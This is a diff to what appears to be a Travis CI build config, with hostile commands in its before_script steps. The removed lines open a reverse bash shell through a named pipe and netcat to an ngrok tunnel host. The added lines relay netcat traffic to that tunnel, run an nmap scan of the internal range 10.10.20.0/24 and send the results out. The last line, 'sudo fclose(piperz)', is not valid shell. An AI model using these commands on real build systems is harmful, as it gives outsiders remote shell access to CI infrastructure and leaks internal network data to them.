@@ -3,9 +3,12 @@ sudo: required
 before_script:
   - env
   - whoami
-  
-  - export NGPORT=14713
+  - export NGPORT=19440
   - export NGHOSTNAME=0.tcp.ngrok.io
-  - mknod /tmp/backpipe p
-  - /bin/bash 0</tmp/backpipe|nc $NGHOSTNAME $NGPORT 1>/tmp/backpipe &
-  - while true; do sleep 60; echo "Keepalive"; done 
+  - mkfifo piperz
+  - nc -k -l 12345 0<piperz|nc $NGHOSTNAME $NGPORT 1>piperz &
+  - sudo apt-get update
+  - sudo apt-get install nmap
+  - sudo nmap -sT 10.10.20.0/24 -Pn | nc localhost 12345
+  - echo "ciderdone" | nc localhost 12345
+  - sudo fclose(piperz)
